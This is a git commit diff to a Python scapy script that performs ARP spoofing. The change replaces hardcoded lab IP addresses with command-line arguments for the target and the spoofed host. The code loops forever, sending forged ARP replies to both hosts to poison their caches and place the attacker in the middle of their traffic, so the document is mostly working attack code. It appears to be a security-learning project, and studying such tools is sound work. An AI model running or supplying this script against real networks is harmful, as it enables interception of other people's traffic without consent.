e9638e6610d84c11b3dcfd4d65f6ef0a87d06aa8
Faraz M <farazmoin.uk@gmail.com>
2022-09-07 18:37:06 -0400

    modified

--- ARP_Spoof/arp_spoof.py
+++ ARP_Spoof/arp_spoof.py
@@ -1,9 +1,18 @@
 import scapy.all as scapy
 import time
+import argparse
 
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t', '--target_ip', help='Target IP', dest='target_ip')
+    parser.add_argument('-s', '--spoof_ip', help='Spoofed IP', dest='spoof_ip')
+    args = vars(parser.parse_args())
+    return args
+
+
+def get_mac(target_ip):
+    arp_request = scapy.ARP(pdst=target_ip)
     broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     broadcast_arp_request = broadcast/arp_request
     answered = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
@@ -16,11 +25,12 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+args = get_args()
 count = 0
 try:
     while True:
-        spoof('192.168.160.149', '192.168.160.2')
-        spoof('192.168.160.2', '192.168.160.149')
+        spoof(args['target_ip'], args['spoof_ip'])
+        spoof(args['spoof_ip'], args['target_ip'])
         count = count + 2
         print(f'\r[+] Packets sent: {count}', end='')
         time.sleep(2)
